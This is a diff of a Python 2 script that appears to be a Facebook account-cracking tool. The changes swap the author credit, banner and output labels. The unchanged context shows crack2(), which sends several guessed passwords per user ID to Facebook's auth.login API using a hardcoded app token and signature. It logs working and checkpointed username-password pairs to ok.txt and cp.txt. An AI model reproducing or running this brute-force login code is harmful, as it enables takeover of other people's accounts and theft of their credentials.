@@ -1,7 +1,7 @@
 #!/usr/bin/python
 # coding=utf-8
-# coded by : Tech-Abm 
-# https://www.facebook.com/Techabm
+# coded by : Arbab-Ali
+# https://www.facebook.com/ArbabAli
 
 try:
     import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests
@@ -9,7 +9,7 @@ try:
 except ImportError:
     os.system("pip2 install requests")
     os.system("pip2 install mechanize")
-    os.system("python2 ab.py")
+    os.system("python2 MrX.py")
 try:
     os.mkdir('save')
 except OSError:
@@ -69,19 +69,19 @@ logo = """
 ██║░░██║██║░░██║██████╦╝██║░░██║██████╦╝
 ╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝╚═════╝░
 \x1b[1;93m--------------------------------------------------------------
-\x1b[1;92m➣ NAMA 💉 ARBAB ALI MEMON
-\x1b[1;91m➣ INFO 💉 HACKER 0.128R.S
-\x1b[1;93m➣ SPED 💉 3.0PYTHON LOVER
-\x1b[1;95m➣ NMBR 💉 03003023263:9PM
+\x1b[1;92m➣ NAMA 💉 |✰✰✰ ARBAB ALI MEMON ✰✰✰|
+\x1b[1;91m➣ INFO 💉 |✰✰✰ HACKER 0.128R.S ✰✰✰|
+\x1b[1;93m➣ SPED 💉 |✰✰✰ 3.0PYTHON LOVER ✰✰✰|
+\x1b[1;95m➣ NMBR 💉 |✰✰✰ 03003023263:9PM ✰✰✰|
 \x1b[1;93m--------------------------------------------------------------
-\033[1;91m       🔷🔷🔷———————————————————————————————🔷🔷🔷
+\033[1;91m     ✰✰✰✰✰———————————————————————————————✰✰✰✰✰
 \033[1;91m      __  __            __   _           
 \033[1;91m     |  \/  |   __ _   / _| (_)   __ _   
 \033[1;91m       | |\/| |  / _` | | |_  | |  / _` |  
 \033[1;91m       | |  | | | (_| | |  _| | | | (_| |  
 \033[1;91m     |_|  |_|  \__,_| |_|   |_|  \__,_|  GANGE
                                                    
-\033[1;91m       🔷🔷🔷———————————————————————————————🔷🔷🔷
+\033[1;91m     ✰✰✰✰✰———————————————————————————————✰✰✰✰✰
 """
 
 
@@ -401,14 +401,14 @@ def crack2():
 		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		    d=json.loads(q)
 		    if 'www.facebook.com' in d['error_msg']:
-		        print("\033[1;94m[\033[1;97mCheck-point\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+pass1+"\033[1;91m-⋄-\033[1;97m"+name)
+		        print("\033[1;94m[\033[1;97mARBAB-CP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-✰-\033[1;97m"+pass1+"\033[1;91m-✰-\033[1;97m"+name)
 		        cp=open("cp.txt","a")
 		        cp.write(uid+" | "+pass1+"\n")
 		        cp.close()
 		        cps.append(uid)
 		    else:
 		    	if "access_token" in d:
-		            print("\033[1;94m[\033[1;92mSuccessfull\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+pass1+"\033[1;91m-⋄-\033[1;97m"+name)
+		            print("\033[1;94m[\033[1;92mARBAB-OK\033[1;94m]\033[1;97m "+uid+"\033[1;91m-✰-\033[1;97m"+pass1+"\033[1;91m-✰-\033[1;97m"+name)
 		            ok=open("ok.txt","a")
 		            ok.write(uid+" | "+pass1+"\n")
 		            ok.close()
@@ -418,14 +418,14 @@ def crack2():
 		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		            d=json.loads(q)
 		            if 'www.facebook.com' in d['error_msg']:
-		                print("\033[1;94m[\033[1;97mCheck-point\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+pass2+"\033[1;91m-⋄-\033[1;97m"+name)
+		                print("\033[1;94m[\033[1;97mARBAB-CP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-✰-\033[1;97m"+pass2+"\033[1;91m-✰-\033[1;97m"+name)
 		                cp=open("cp.txt","a")
 		                cp.write(uid+" | "+pass2+"\n")
 		                cp.close()
 		                cps.append(uid)
 		            else:
 		                if 'access_token' in d:
-		                    print("\033[1;94m[\033[1;92mSuccessfull\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+pass2+"\033[1;91m-⋄-\033[1;97m"+name)
+		                    print("\033[1;94m[\033[1;92mARBAB-OK\033[1;94m]\033[1;97m "+uid+"\033[1;91m-✰-\033[1;97m"+pass2+"\033[1;91m-✰-\033[1;97m"+name)
 		                    ok=open("ok.txt","a")
 		                    ok.write(uid+" | "+pass2+"\n")
 		                    ok.close()
@@ -435,14 +435,14 @@ def crack2():
 		                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                    d=json.loads(q)
 		                    if 'www.facebook.com' in d['error_msg']:
-		                        print("\033[1;94m[\033[1;97mCheck-point\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+pass3+"\033[1;91m-⋄-\033[1;97m"+name)
+		                        print("\033[1;94m[\033[1;97mARBAB-CP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-✰-\033[1;97m"+pass3+"\033[1;91m-✰-\033[1;97m"+name)
 		                        cp=open("cp.txt","a")
 		                        cp.write(uid+" | "+pass3+"\n")
 		                        cp.close()
 		                        cps.append(uid)
 		                    else:
 		                        if 'access_token' in d:
-		                            print("\033[1;94m[\033[1;92mSuccessfull\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+pass3+"\033[1;91m-⋄-\033[1;97m"+name)
+		                            print("\033[1;94m[\033[1;92mARBAB-OK\033[1;94m]\033[1;97m "+uid+"\033[1;91m-✰-\033[1;97m"+pass3+"\033[1;91m-✰-\033[1;97m"+name)
 		                            ok=open("ok.txt","a")
 		                            ok.write(uid+" | "+pass3+"\n")
 		                            ok.close()
@@ -452,14 +452,14 @@ def crack2():
 		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                            d=json.loads(q)
 		                            if 'www.facebook.com' in d['error_msg']:
-		                                print("\033[1;94m[\033[1;97mCheck-Point\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+pass4+"\033[1;91m-⋄-\033[1;97m"+name)
+		                                print("\033[1;94m[\033[1;97mARBAB-CP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-✰-\033[1;97m"+pass4+"\033[1;91m-✰-\033[1;97m"+name)
 		                                cp=open("cp.txt","a")
 		                                cp.write(uid+" | "+pass4+"\n")
 		                                cp.close()
 		                                cps.append(uid)
 		                            else:
 		                                if 'access_token' in d:
-		                                    print("\033[1;94m[\033[1;92mSuccessfull\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+pass4+"\033[1;91m-⋄-\033[1;97m"+name)
+		                                    print("\033[1;94m[\033[1;92mARBAB-OK\033[1;94m]\033[1;97m "+uid+"\033[1;91m-✰-\033[1;97m"+pass4+"\033[1;91m-✰-\033[1;97m"+name)
 		                                    ok=open("ok.txt","a")
 		                                    ok.write(uid+" | "+pass4+"\n")
 		                                    ok.close()
@@ -469,14 +469,14 @@ def crack2():
 		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                                    d=json.loads(q)
 		                                    if 'www.facebook.com' in d['error_msg']:
-		                                        print("\033[1;94m[\033[1;97mCheck-point\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+pass5+"\033[1;91m-⋄-\033[1;97m"+name)
+		                                        print("\033[1;94m[\033[1;97mARBAB-CP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-✰-\033[1;97m"+pass5+"\033[1;91m-✰-\033[1;97m"+name)
 		                                        cp=open("cp.txt","a")
 		                                        cp.write(uid+" | "+pass5+"\n")
 		                                        cp.close()
 		                                        cps.append(uid)
 		                                    else:
 		                                        if 'access_token' in d:
-		                                            print("\033[1;94m[\033[1;92mSuccessfull\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+pass5+"\033[1;91m-⋄-\033[1;97m"+name)
+		                                            print("\033[1;94m[\033[1;92mARBAB-OK\033[1;94m]\033[1;97m "+uid+"\033[1;91m-✰-\033[1;97m"+pass5+"\033[1;91m-✰-\033[1;97m"+name)
 		                                            ok=open("ok.txt","a")
 		                                            ok.write(uid+" | "+pass5+"\n")
 		                                            ok.close()
